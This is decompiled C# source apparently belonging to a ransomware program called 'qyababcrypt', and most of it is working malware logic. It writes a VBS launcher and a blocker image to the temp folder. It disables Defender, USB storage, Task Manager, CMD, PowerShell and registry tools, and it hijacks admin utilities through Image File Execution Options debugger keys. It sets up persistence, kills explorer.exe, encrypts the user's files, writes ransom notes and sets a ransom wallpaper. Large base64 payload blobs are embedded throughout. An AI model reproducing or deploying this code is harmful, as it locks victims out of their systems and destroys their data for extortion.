/DJQuhBOFhHn8UhtQ4AOoBFpBtyr6NhoJxRxs4zZ+zUH6D1BOAIAvRYAg97CzkHpgbOL4/uGTvhDm9JPvn3TQ5T7xWAtxvwFf9EThb/GnPlv1dzuykDn+B4zgSiBFhreWK1a/CaGw+CBUkKU0AkMjb3XmPk9XCqWMjUECrB8pVZLmdy2/e617rvFh0AY4+lA3SR07fKoWVVEOp5Ckiv0t5retbn6avg8oT46XsfJp8bN/RyQzkbDTt6ikE3cKpkRYLFA0i50Fp3Pn4urXl2VmgrAAREAK6BALbd0QmmZyzM1P++nl8Z21LcDYCpkkLPonOYJYke80LlvAfg/a11KQFyyHsn0m28sVDfrs9bfSy94nrN16y6Ws0oo/B4mbp3gkCOMNTS7MpjzZBvQL7bx6A3595bCiFcJBZwlEvfiXoI1aDC6NMA7K1ulxBjSp0c906B5ljaonvj3li9buug9Vkwb3AdhFkKQD+mFQfjZHtVvdJVD2irfgWyPaXI5jioia5CWwx4L0nAWo0pNXOarKM9Jem4iUMzSrpgSXdgAE4LcOqPsgApx5AKAeXILuBuUENeQsroDktG6EJkcmuZ4AnAN14F50Hk/nkPgK42Z5tfdDVEiKAIPCSgwetVba/DgQxoORrQeyeD3rK3llIKUinpVezOwZJCzOS/BEAgY2vYLZGRMuvnsw7T1wmzX8NLhHzDygMY85tOeShnnEEnXgfL2pRf/XIyioeuCiptFcAdiAXbUrfMewMOljPTFzVZ0Y02pmqlZp8B7iq6gUnn9PYA8hbo3iyicwvWZGEOgaf+JAA6BqDRCBEwnEFvq8WA5D7YQjMwpuiYfL23+72zAcgQOuUlg9UymORZ3K5q/bsesAGYcy656N+BwHy9EXjv/Ou5jpMFHmEvfl0c4g3VBPS85KTJmDdc3tFPPNdX1FBA4Ks/LeeAarAIHh9yp9NAWe95G4kQQDzhSHLILeKEVpwDoAo4nc544xlIgISEMNogcoN3RG5ZHRL61elZDwnmHKCp4orCcSXJtQBoYrQk9ZB3yVWGNA4CEC6rtOdg7OWnsrVZ6SDGYGB+Lab+IACKxQLiAyZAm0YQNIK4QHgnoAwqiwwqU2qt3SWv3pvFug89h3jKrDNdwA+kVeeEf0+9IBDBf9NbtwgBdXPFxxtEM2ok3ZOgj/+o5B0v6wsxxtqvRyjgwvoSAKMBByZ3C2w6oZF0DMJCamx3biEZZKTEoB8jZt7NbnOUKp4xxFozgXNodx6+MrpNqSHsFtHW1lK48F2Y8NjbbV3A1syIs52fomUCHv9jqaEadKvYhFSk4VgNtngRa3dPnWRuT2Y46p5azq2gB9prNqb3UlPqBqnzBakReAyR3Jz9m/qTJMZITiFkBCxhlD4iskyTbTdkc5dBZeSau1uMsd2NV9q9Jn+BZzjIcGHKLPvfIlgAaPNehroysAgChYDnqavagNcrei9TgnJf8MhpYVDTdQ3xBoNPyFf3Uqy1hgDVD/y1ZDAeKEZictVUEASA7U4CQI9G7hS3ZJBsC7FuW9gJqSc+EGIRmyywQ1ry02BuKW6XSAi0pxhr6kQ17fu+/bVZcMB2ZEzoPZaUUSLV2Z0dOnnPfalbkF7wLAHmFJm5l83QHi9xL2RCsjA8x1D4g+imhJ2koU4mhRpjTN1QiVvc90zOU6g4lwJP/UESf4Ks8a0GwbSN6bGFthddERxijYkLjosxJUhpzSAvNj0dw8w/ABn3njNViDrq8+vfE1gtwJN+WX8NjwiBwvbZDk8DrhL1pnGBi4ObrAmmkiQL4EPc45Ra7aVYYwwhixCA+siO4NfP8w9sqOQc7TEWQ+hB0ORXAaBNOxGaLRLa1AqRqVu0aGoyRLTHgmyTZULTGZ9oUzVUQiXEknZLaAzlVAhNvSSSz9NRigSAO6OMYigGTQxW8A8mXqpB0Ew+RWb7ynaJhu9YuFG25rgZPr4H2WdTRKRy2QzaFHZDtiWDWAMfBICcdlxU68Tg1P+8vAIQRnjIaUNdwjYKTm4inVO7aJrl1slrdIaGVUjuK7ccAFwWmRE018yMkD0/FgM0C/3U8CtdEdiFgDf03+QBHNOAbmV3swAAbrndjXY/qNHXOfJZ2McgJpZ5CAX1lmM+vuIGsWlHRs8Wau/ZMJoyeInCw8xYcyZEpD3tBMCctAxD3u7NoknRCIOTlddCWEIhoBotOQeInW1GG2NFz+I72Ydq5IcL1QBQDQY4EAbsdukEXhwljDCxES+V0LRmwGOJFUcS7hUqN+zApMjHQ+U7J4uCZ4CaDIL3wM8AfgJw6s9ioMMcQ+gEaFq6nEPIsaF/FH6pxqTF1c70m4N/R2ZV4QTdJKqFx6f/5IvEAMxlqL9s5IfM7dsFx96B5IbhLIEvZTItOsqtdW7AGhL08a+xEqTX3nq/EvuBxbP9hZQ5AoiF0RP33lMnRpem+VLEAdiwk5G9jmqMBkvq6By1ZimHncCDQsekJgC1CDZV4k8QwG7bvtct7uTksXLYYkvxwgAUuxFMjeIXcWi3yz4A6E1MBhyWLewow3LvsIQdRh3lBeNmEdxCMRLuqVnEXZFZk0Xe6/n+2JuF6f+d+sPkqOvMGFBWE/Ct1I0QUuul7E3KYB5LuNwCmvsPGKUih2TyEJtv/wCAeLODgP35l5WZoui/nbT0bAL6FUDDRUZ59puHm7EMPmGfsRoO2MQzHLbwUMrGNsmJtXwFgKY361col8tuiAejJkbjFYCmNQuCKTKxGhCzOhrcg0UHtnVDnZkDWPiwgBGIWYhqV7pVTLhYH2Cz6MTH3EMtZa9bJaA2UvVUBuDKtLsoJ4FpWsXkvATLzd1RerIjyIQEeAqRxGaumzUpWhJLUmzGapCtVg7ZYYgbmCnxp/4src60MOJdKEvS5zfiKruxtZ6tIbaxLGoA7zn/JzBUi1BoZmweEhPwXdKoVfQ2wu7VD9zHa1cCinX0tu4IMBZZqwDQaWpU8F6WgIjJV6twT9eBHEZs6NZ0flbp7ye1go3NOIf5shUCYgBukTSYGRlx4KknSzZWYtCxY51BAwuUVIiPwcJc7KTzemhiIsAcdpTK8GaP1doYLGmQDV+BSCUWBJLZOtPCzmavWoDVMDUfsqGOETBblcrZzNDzMh3LdqlEf0Pddu4KOopBZxcL8dV61PSM3rvpB576k7SCTRIEw2QhW+L2BoGXkKrCDwFIQ+6EfW7wDzRARcgmQX1iznWZw3sPwI9yEgOS1Yv47/4CQYXot2kAPc8CHvxT/ph8z+g9mNxrZG3bWATy5llSMSWFZuELAPRYJJ8qCQCRrT8bqq6xALKSZ8a0ZjQOjy3EaHmb/CJ2IPXAl+2XUFD2iwGGgiqDZAhL3A1qqI18lNwaAJVmBYDF2D2FAutDAsBQCJCyRRsioa3btpPDnV33CGa7FEIim4nKAcB9Y2cwgDNhs4ZsakbwqXOAtlvk+cU5ATj1RwFQ58UYCV5i1V4ReAk1G9KVaYu/PQBIDMBRaIL555b1BKAH4Z8ijOmFbv1H8SXG5DwQuB8I3PdSGID4FlYCPPY7AxwL0IC0QJKnewqKvo8VuskptAxfsgAlHMXxEDjueww72bRzH+RTSwW9TOchxVDLnkIthFYBWINF7GGre922zZq9hh3VqQJgt7/qXpM1NVkEQaOsvkGrI9uuALxslbluQbMu0r499tSamkWzXSr/q8VCC9bHbnGt/LXFvcbYjOmhoPf8BHx3BAAbHmftMRUEtmj3YshDaRnBj0SBcy5w6g9JBoglhGhHThEA09uTgDxsNOj9qpKQY6crW70G4rnhox2X37K1hwUnAPwHXfAe2WvMUvSN6wWA+fZNG2x5ek65inDcGW5k72It3dPGdt/3dKnGSnE47u7nAcgkcsCuiVpDspRbAcE+2T1ZIVpHxD2kWlMqFsHWigxAnesLMXJ8jqEaQ+GWUhGvMjvbgxVXBlCMCLKehlsjHADEHC4xbCEpAFfAUkPYYgwtI7fA7u+acYGdQ7AJsG4h8BXNyFDaewc8cchDcic5L7YYtGXN7uOhp8zW9gTg1J8gP8KLHe0hRKOGnM5nlRpPAoaiNTXEDSp2liRpYiPEjUUZclQrK9FLTB8DEJiWb6f+vJNKmf5tHTnEA4EqHQt3GQKrf3kdqQed5o/hxDCaLYU5TCZ3qVUnTpwfAdCIF+QrX3DM3UjKALu3hwzqKlvuPtreDS6Q71eQjGFJ80XA9Z5hXeh+Jz92lz0bo6upUa9H21vrmXK36JBaIc0QA/luEUDu4oF6anvp2RyF3lByIbRO6KUF/rQIVm+6zNMC2d74EgK838mtwD2PoSC7O/aw1zbK2pue+AKHvRmAhbXO1cBTfwoARxSgDIAfcrLqf49KEl0WguI08JKBnsCxRu57fAGgFD/PNp/e3Jzv3wBQAAsONGXzEFOMCUi3gUD908vpBGH2aY/HpJ+W2kR+qwGBQJmZgi8AvLyI4wMvJwBDNf7TgdCaZkrmCXCEeQMi7+DhKpB0Ewn5E0Xi47wDtGYTqQGm+xH4bO8AZJHveT7y5wxA6EeyU96hXgzvAY6LlyPzFwBKjPdjG8kQIWlYDBK9XgHcgobZ0J7Ec+xoT5YeYp5Lt7Sv3FlNpz8twKk/QezwAytRgAwVc66aMPaojn4JsVsSYqFtLcs0uXDgNUHzGdGcnwEtagG+LZkpX0vEGz6ktS7OAx50IPxWzNgjb6dy91knzil2ta7wlY1T9oQerusoarXVXnvve5VaJ1aXA8MXALhyH8EpwmU5mvOa3GX0jk+Q2HAlPB9wcoF3Rz4dAHCwegAPDsCzNHacD/HjvWSTWZzueUjesI5EMEf5AVALlDcYxsz18+7Oy4bX/euqq09gkfqmjRCA4c3SXirP1wnAqT9GTkZ2UaIAkT2ote/ZMgTJlBo2XVIbazYEIMXQr+gFOsK/K5xZS3VNm3hAsuKv53cA9IBE1+uoFnLzCsBhGarNcjM3DeHLVgNpbuAPAMJteJWFfwhOxGXYwYORGsGmapcre1CKZRlrRLZeLgzAIpOAXwEgeKcalHIgMwMq4ZhGSKpWFsNSQHTkyV9F/IZfj6R8gi39vaqES2fbfDq3rjnBRhkp7cMqABQUSh04vgj0YxecykerfTH3ZgGW1YFtd0IY95FuKrUVgDMScOqPkIJMTSJEU2KQguh1L8xAsnsbCAyta4IlCXbTS+E6DMBTTtNavSznverZQ074xrlPrQJwRE8PfHoWyFCYbg9dzeOF8ESo5E0VVOoqYGDrSN7cr957yvdMQCXxiLdaIhSBymm5u0vKpKHQnwegwmQZNplCy+t+xR/jRzP2KXrkDM13Knj3fgCQkcNEEwA6AG3rTCY20uNzawdaPQyjUG++8AZvjm5xw4pEBaDs1D4u0pq8WygbdCvfmIxBxS9TVdmtjbllAnDqj9C6KgCN5AdAKnWMebcttW4N0TkOlipwCGMELDNyYwzK70SrLmkronMp7w3kBJXU9Mg2X7Pg77Z6RcgzLFB5Amd2uzPbntqXuraOz5BB76Jf60XKsLOL4m4AbONCJrsBf6aoPviZw4VdOvq8vPtTGtlGX3PggxvFJFcFHigA5aB+MmL/KQBZSkUd9C5OSCjW3MCoV1rquPYFgMtJKT1zHJBruFvyqkGR56ETgIPV4r1BBKftsTSCEfzrLTy3MWsiTf1JABSLCA3zTyU2lCIw1zgI2BFz6xZGaTIUG4yJcNaDwxs7QHa1AEcUjH8CkOtkyuDW3u+3G95gff0yv60mrm7QgxlieKHknGHkCnxRvrjiy8A7j8vB9rsFRz1oVc8zTfUq8gA5SlAP9SC1Pj8rtaS0KaWGO+tgCmHeFIvzXqA47j8+IadIHAxleOsWH5DjeqW2O7Do1wG5s5CSO/LjAAzSyjH1MOmd9beSTzq06F7QWyyC2uNjPmoEH9hmAM6kWFN/CACBh4QZyaqxN3TZdNgrK0MYiLHTWAayiKVxu9+cG9+9kaD5NafB8OCCWDsqmfkzNmfDwHLiyHy/8PRN2hcvG8+cW2MWjOF74GZdZTCOC5jcMjrMUQogIcPzDb60zntVANrPA9AzkoVQrJeCRV57AQocfjPQ/JyqGx/3c/jshkWpIeW8JTvfANCNn3PErRhbxtFF33lpW8ksJ4r/w43+ikaBpsWJRseVgu6bMiFqt04ATv3va9RkxCwANPsr/8awtxtEsnsKm4Tb9nZHWQUCHu9X9xZeHl4SO3d1gRAIGXUwx5hCMjL8xY8HWa/FMJ/71Osr7hA2oUYyGL8MDZcw4L11A2irFHY3TgC4irw0YYYXxKYQv5L1RL3Wqz6SWlwv1dZALS4vv4dz92UUrluKs+fzvd1yoL5mPlkgdjpI+DRlLXNL2zk7wS0+LcYBSb1meJm0LT1Br3ID6afl+GrlHsWoPg6HdsdTiLRJ58aJI/+Mtq53OVHN8ueNnP7SI96f3VmeYQVi/4tmpeKpny6v8KASQ7LKjYvk/jsIyHNplmRxXGvZoGlJAegA2ABc3grVAByj4PJMBiMo0ix+gHS9EvPPfd8ufacDcY7lpSH9xg2Nw9fezfB1XGLG1zK6AkDag9iGJgW2ED/NP30UryB67tXXkyxejvkTSKzz9EFNNV5PF7hKL+YDiodvALisAxcnRPzyCkBtgTWukRfpx/qCj3cAFJ0AHC2eNqtf3mrVcwRNp9TW/haAKn8MsIeU1drlJwBPGMqxE4Dj0ebS5KlfIC92C5oeQzKo2ZRjrVEqqp1R0JYQyeZM4gO5SvgIeKnN9j6xs81Fpat4CdwTgCwnuVI1AO0T5NFBLwgUZFssmlf3BM8voildM0ZtG3ec6SvSRt4AMBXyXxgCezfo8iTa86h+V99CnM9XOL7i5dWvcohZI8CR8/WCoeOtVytTUeG/h2j9aBR/oCh7xdXzQt33csAfrPmeJ1gB9Xxqr6zibo+h+8lxReG5V5E3mn8DuZNvcvz0rZ86BukTglM/WU4ASLlHzVvHno9ije29xmMxMO8yCKgJ01szkuH0QwNwpTdTgDlng3Asr3uJ9hvBvOsPSfOmYb/wANgp/9jcA+f9CcDhR+Ak1L1l9GA6EzydS5iPs7TmcSpoosTBLJ+VdB38ANor8EZp0I+sWEXWy4zhq043jeJVSi+7gYD1aaiDG4E0cNhIvPtV61sA+uFKB5DWhNxKmeepHwDQawvDYfL39vnhpwZwcvnrGedIX29+8u3ldXkl4nn+8kr/40ObAJz6JQBk10FNoRKqdUTgtLhujWcUdNb8V4C5MTZ4E9gI+xYPt5xtUe1dDED0LwBc1vG1lTefAKB4fc+cWPri3xWLcygAJOcpJ1npz+T2XkNEWOwEUQswshv40wAUAilV3Ou8nr4O98gL206sDPx9aCHKYcWEchTpBuDVOaIHhuVM6GVtHJ/12sYb2GrrElFujKEjVFKBc/TqcOF8qPFhfXzo3HjCnTtChkB68q7ZQTR3ME+vOULADw57bXMQ/MVOHQB9vMwchVO/CIA9hlCJ9gccqsVlGQXQ8x6D1EEKLaOcebu3TuLc9Lf71cG7xPbf+IANwjHQ+Qh56w/551/PlKRbb9aUvLtc5vikMoiT4msXJqAlBH/yjwqvhUsZTRUAuq9URtfi[...string is too long...]";
				string tempPath = Path.GetTempPath();
				string text2 = Path.Combine(tempPath, "qyabab_block.png");
				string text3 = Path.Combine(tempPath, "qyabab_show.vbs");
				try
				{
					byte[] array = Convert.FromBase64String(text);
					File.WriteAllBytes(text2, array);
				}
				catch
				{
				}
				try
				{
					string text4 = "On Error Resume Next\r\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\")\r\nSet objShell = CreateObject(\"WScript.Shell\")\r\ntempPath = objShell.ExpandEnvironmentStrings(\"%TEMP%\")\r\nlockFile = tempPath & \"\\qyabab_last_show.txt\"\r\n\r\ncurrentTime = Now\r\nshouldShow = True\r\n\r\nIf objFSO.FileExists(lockFile) Then\r\n    Set objFile = objFSO.OpenTextFile(lockFile, 1)\r\n    lastTimeStr = objFile.ReadLine\r\n    objFile.Close\r\n    If IsDate(lastTimeStr) Then\r\n        lastTime = CDate(lastTimeStr)\r\n        diffSeconds = DateDiff(\"s\", lastTime, currentTime)\r\n        If diffSeconds >= 0 And diffSeconds < 5 Then\r\n            shouldShow = False\r\n        End If\r\n    End If\r\nEnd If\r\n\r\nIf shouldShow Then\r\n    Set objFile = objFSO.CreateTextFile(lockFile, True)\r\n    objFile.WriteLine currentTime\r\n    objFile.Close\r\n    \r\n    Set objApp = CreateObject(\"Shell.Application\")\r\n    objApp.Open(\"" + text2 + "\")\r\nEnd If";
					File.WriteAllText(text3, text4);
				}
				catch
				{
				}
				text5 = "wscript.exe \"" + text3 + "\"";
			}
			catch
			{
				text5 = "svchost.exe";
			}
			return text5;
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00007A28 File Offset: 0x00005C28
		private void ApplyAllBlockings()
		{
			string text = this.DeployBlockerImage();
			this.DisableDefender();
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR", "Start", 4, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\cdrom", "Start", 4, RegistryValueKind.DWord);
			}
			catch
			{
			}
			string text2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
			try
			{
				Registry.SetValue("HKEY_CURRENT_USER\\" + text2, "DisableTaskMgr", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_CURRENT_USER\\" + text2, "DisableChangePassword", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_CURRENT_USER\\" + text2, "NoLogoff", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_CURRENT_USER\\" + text2, "HideFastUserSwitching", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\" + text2, "DisableTaskMgr", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\" + text2, "DisableLockWorkstation", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\" + text2, "DisableChangePassword", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\" + text2, "NoLogoff", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\" + text2, "HideFastUserSwitching", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			string text3 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";
			try
			{
				Registry.SetValue("HKEY_CURRENT_USER\\" + text3, "NoClose", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_CURRENT_USER\\" + text3, "NoRestart", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_CURRENT_USER\\" + text3, "NoSleep", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_CURRENT_USER\\" + text3, "NoLogoff", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\" + text3, "NoClose", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\" + text3, "NoRestart", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\" + text3, "NoSleep", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\" + text3, "NoLogoff", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			string text4 = "SOFTWARE\\Policies\\Microsoft\\Windows\\System";
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\" + text4, "DontDisplayNetworkSelectionUI", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			string[] array = new string[] { "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" };
			foreach (string text5 in array)
			{
				try
				{
					Registry.SetValue("HKEY_CURRENT_USER\\" + text5, "DisableRegistryTools", 1, RegistryValueKind.DWord);
				}
				catch
				{
				}
				try
				{
					Registry.SetValue("HKEY_CURRENT_USER\\" + text5, "DisableCMD", 1, RegistryValueKind.DWord);
				}
				catch
				{
				}
				try
				{
					Registry.SetValue("HKEY_LOCAL_MACHINE\\" + text5, "DisableRegistryTools", 1, RegistryValueKind.DWord);
				}
				catch
				{
				}
				try
				{
					Registry.SetValue("HKEY_LOCAL_MACHINE\\" + text5, "DisableCMD", 1, RegistryValueKind.DWord);
				}
				catch
				{
				}
				try
				{
					Registry.SetValue("HKEY_LOCAL_MACHINE\\" + text5, "NoRun", 1, RegistryValueKind.DWord);
				}
				catch
				{
				}
			}
			string[] array3 = new string[]
			{
				"cmd.exe", "powershell.exe", "pwsh.exe", "taskmgr.exe", "regedit.exe", "msconfig.exe", "mmc.exe", "taskschd.msc", "control.exe", "eventvwr.exe",
				"perfmon.exe", "resmon.exe", "services.msc", "compmgmt.msc", "devmgmt.msc", "diskmgmt.msc", "gpedit.msc"
			};
			foreach (string text6 in array3)
			{
				try
				{
					Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + text6, "Debugger", text, RegistryValueKind.String);
				}
				catch
				{
				}
			}
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WindowsPowerShell", "EnableScripts", 0, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WindowsPowerShell", "DisableCommandLine", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
		}

		// Token: 0x06000080 RID: 128 RVA: 0x0000821C File Offset: 0x0000641C
		private void GForm1_Load(object sender, EventArgs e)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers", "etc", "$decryption_done.flag");
			string text2 = Path.Combine(Path.GetTempPath(), "$qyababcrypt_decryption_done.flag");
			bool flag = File.Exists(text) || File.Exists(text2);
			if (flag)
			{
				this.PerformFinalCleanup();
				Environment.Exit(0);
			}
			else
			{
				bool flag2;
				Mutex mutex = new Mutex(true, "Global\\qyababcryptMutex", out flag2);
				bool flag3 = !flag2;
				if (flag3)
				{
					this.PerformFinalCleanup();
					Environment.Exit(0);
				}
				else
				{
					bool flag4 = Interlocked.CompareExchange(ref this._payloadExecuted, 1, 0) != 0;
					if (flag4)
					{
						this.PerformFinalCleanup();
						Environment.Exit(0);
					}
					else
					{
						GC.KeepAlive(mutex);
						TimerPayload.CheckAndExecute();
						base.WindowState = FormWindowState.Minimized;
						base.ShowInTaskbar = false;
						base.Hide();
						bool flag5 = File.Exists(this.string_5) || this.CheckForEncryptedFiles();
						if (flag5)
						{
							ThreadPool.QueueUserWorkItem(delegate
							{
								try
								{
									this.KillExplorerOldSchool();
									this.KillTargetProcesses();
									this.Method_UnpinAll();
									Thread.Sleep(300);
									base.Invoke(new Action(this.Stage3_ShowGUI));
									bool flag6 = !File.Exists(this.string_5);
									if (flag6)
									{
										this.Method_EncryptSystem();
										this.CreateRansomNotes();
										try
										{
											string directoryName = Path.GetDirectoryName(this.string_5);
											bool flag7 = !Directory.Exists(directoryName);
											if (flag7)
											{
												Directory.CreateDirectory(directoryName);
											}
											File.WriteAllText(this.string_5, "done");
											File.SetAttributes(this.string_5, FileAttributes.Hidden | FileAttributes.System);
										}
										catch
										{
										}
									}
								}
								catch
								{
								}
							});
						}
						else
						{
							this.TriplePersistence();
							this.ApplyAllBlockings();
							ThreadPool.QueueUserWorkItem(delegate
							{
								try
								{
									this.ExecutePayload();
								}
								catch
								{
								}
							});
						}
					}
				}
			}
		}

		// Token: 0x06000081 RID: 129 RVA: 0x0000834C File Offset: 0x0000654C
		private bool CheckForEncryptedFiles()
		{
			try
			{
				string[] array = new string[]
				{
					Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
					Environment.GetFolderPath(Environment.SpecialFolder.Personal),
					Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)
				};
				foreach (string text in array)
				{
					bool flag = Directory.Exists(text);
					if (flag)
					{
						try
						{
							string[] files = Directory.GetFiles(text, "*" + this.ransomExtension, SearchOption.TopDirectoryOnly);
							bool flag2 = files.Length != 0;
							if (flag2)
							{
								return true;
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x06000082 RID: 130 RVA: 0x00008404 File Offset: 0x00006604
		private void ExecutePayload()
		{
			bool flag = Interaction.Command().Contains("debug");
			if (flag)
			{
				bool flag2 = !File.Exists(this.string_4);
				if (flag2)
				{
					File.WriteAllText(this.string_4, "121212");
				}
				base.Invoke(new Action(delegate
				{
					Class1.MyForms_0._o_program.Show();
				}));
			}
			else
			{
				Thread.Sleep(80000);
				this.KillExplorerOldSchool();
				this.KillTargetProcesses();
				this.Method_UnpinAll();
				base.Invoke(new Action(this.Stage3_ShowGUI));
				bool flag3 = !File.Exists(this.string_5);
				if (flag3)
				{
					this.Method_EncryptSystem();
					this.CreateRansomNotes();
					try
					{
						string directoryName = Path.GetDirectoryName(this.string_5);
						bool flag4 = !Directory.Exists(directoryName);
						if (flag4)
						{
							Directory.CreateDirectory(directoryName);
						}
						File.WriteAllText(this.string_5, "done");
						File.SetAttributes(this.string_5, FileAttributes.Hidden | FileAttributes.System);
					}
					catch
					{
					}
				}
				bool flag5 = File.Exists(this.string_5);
				bool flag6 = !flag5;
				if (flag6)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						this.Method_EncryptSystem();
						this.CreateRansomNotes();
						try
						{
							string directoryName2 = Path.GetDirectoryName(this.string_5);
							bool flag7 = !Directory.Exists(directoryName2);
							if (flag7)
							{
								Directory.CreateDirectory(directoryName2);
							}
							File.WriteAllText(this.string_5, "done");
							File.SetAttributes(this.string_5, FileAttributes.Hidden | FileAttributes.System);
						}
						catch
						{
						}
					});
				}
			}
		}

		// Token: 0x06000083 RID: 131 RVA: 0x00008550 File Offset: 0x00006750
		public void KillExplorerOldSchool()
		{
			try
			{
				Interaction.Shell("taskkill.exe /im Explorer.exe /f", AppWinStyle.Hide, false, -1);
			}
			catch
			{
			}
			try
			{
				foreach (Process process in Process.GetProcessesByName("explorer"))
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000084 RID: 132 RVA: 0x000085D8 File Offset: 0x000067D8
		private void SetWallpaperFromBase64()
		{
			try
			{
				string text = "iVBORw0KGgoAAAANSUhEUgAABQAAAAK8CAMAAACHleJFAAAAAXNSR0IArs4c6QAAAAlwSFlzAAAOwwAADsMBx2+oZAAAAEhQTFRFAAAAQwZAWQlV2SHREAEQHgEdLwItCAAEBAEKAQUCwyy8rx+nsy+r5hXgyR/BZRtkcQxvmhmSmjCUgyN/hw9/RStFLRktdTdzsrSvKgAAz49JREFUeNrs0LENwDAAwzBvsf9/uGtRoLmA3LUoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwZ0uStG3z0TY355xk27akfWW+wsPe2Si4jfJs2xBJYGDNn5Oc/5l+kYSdTGfa3Zlt++37lLudjOMfjNPNtQIJaer/kLx3/oN939DyI4Ky5uc3NTX1PyX/A6tx/RiGE4RTU1P/V+QeeqXadwDo9Ez3IQhfj01LcGpq6v+gVtX4/crIN/KHnkPfsdMpM+eAeGpq6v8oAl9IeIr59pZ/quWQZ02/x9TU1P856H3rtnXLU45p6D0AAn4rYAkQD2A+OTlZODU19X9B6zc2nHvuZZ4x/JCIjDHW2Ku1Wf5crWEREaPQHybjGzNxzghOTU3993Uiy3k3xsADiQBIxlibc2fV2l9UciklW2sIEYSb59h58G/OBU5NTf1f0BtnsKIPkYjhV0qvD0VVikM1Vta+F2uNQBCcDJl12DzpNzU19X/MCSyDWABGn5h9TZkXHtrCpi+iTf/EIESsnW1BQ4QA/myLG5sf7NTU1H9bT7+vA8SDfUkURCmmlGJS+y/wn5DGnyCbKbXWSxFb8GDgBODU1NT/Ffx5D4jGlt5rO4y+EGNsrfaWh2wu409/qLFOTKbEtmDP1iB4v8zImKmpqf+2/BEL40FMv14VZymoudd6sdYQC19EImPYWFQQPo3F1Hq2hAATgFNTU/99OSf0K70pxdJDTUw5QyPiTz3F4Pm3bACAHFBfickyam7pZGCxhmACcGpq6j++FhgQyWalX0ps9e2lWI3zM2r7gRvkG64SjQ48YwFZQkG2BWNgHXagm3bg1NTU79eHOQ5GDpfDRevdGPmOmbznkNfYUva91tpq34slEACOxkDmCivTrjU+bAhRocgHYjrHwmaMhd905ETiROPU1NTvAqBqFYwtjgX4pF9qtbLhZ43Ar6ofZBNfSBOSebfKlWisQG6TwyHGpp4P5/3KQM18dRIEts5wPBB4AnCZAJyamvrlcu7d+3ORhgcyQr/TdWGIDNt9cXvo8qIt9WwJFlkZTLanMA6H8Su1bgk0Mwwgkc1dGMgHeiZ8QndmDZyamvrt+f5U/gTQwJ+OVqsOYwFticy+vx66/HVR8faFAUluXRcgu6eDi2Ik8sZlSy0TrACe0eqRjB1WZGpNEOif+F3WuUx4amrql8upXpO/rKwFyJQqEc3qsjVkDALlyvRjbcy3tJ04DKkbWNYF7R4H/WKtfa8xbsLK0C06AF4E5+AhYaDEx+hsIIJ7XD4HvVNTU7+XgO9mBB2a3KMaf0WdHvl+N0AlKv+2Lca6l1IEcIOAGd3i9JQH7+ounmJr9xpkTyzkJfIF6CEUBtqswTGKwJkoa2pq6v+fNGcfg2mviiVrEIBM6S01C1S2gb+eRwA0OzyGDbgTOLR1e2xvoWZ1e3BjLfDxrRrwq8K1Fyu+D0STx0BbEDiWy